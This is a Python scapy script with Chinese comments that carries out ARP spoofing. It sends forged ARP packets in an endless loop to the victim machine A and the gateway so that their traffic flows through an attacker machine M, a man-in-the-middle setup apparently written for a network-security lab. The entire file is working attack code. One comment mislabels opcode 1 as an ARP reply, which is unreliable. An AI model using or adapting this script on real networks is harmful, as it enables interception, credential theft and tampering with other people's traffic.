#! /usr/bin/env python
# -*- coding: utf-8 -*-
# 流量重定向到中间人
# A 和 B为受害机器，M为中间人

from scapy.all import *

# ----------------------------------------------------------
# 根据你的主机填写相关内容
# Machine A:
IP_A = "192.168.60.2"
MAC_A = "02:42:c0:a8:3c:02"

# Machine Server2:
# 因发送给Server2的数据包在局域网内先发送给网关，因此需要欺骗网关和受害机
IP_B = "192.168.60.1"
MAC_B = "02:42:22:3d:6a:d3"  

# Machine M:
IP_M = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"

# ----------------------------------------------------------


print("SENDING SPOOFED ARP REPLY")

# 欺骗A机器，让它把数据发送到M机器的MAC地址
ether1 = Ether(dst=MAC_A)
arp1 = ARP()
arp1.psrc = IP_B
arp1.hwsrc = MAC_M
arp1.pdst = IP_A
arp1.op = 1 # ARP REPLY
frame1 = ether1 / arp1

# 欺骗网关，让它把数据发送到M机器的MAC地址
ether2 = Ether(dst=MAC_B)
arp2 = ARP()
arp2.psrc = IP_A
arp2.hwsrc = MAC_M
arp2.pdst = IP_B
arp2.op = 1 # ARP REPLY
frame2 = ether2 / arp2

# 循环发送
while True:
    sendp(frame1)
    sendp(frame2)
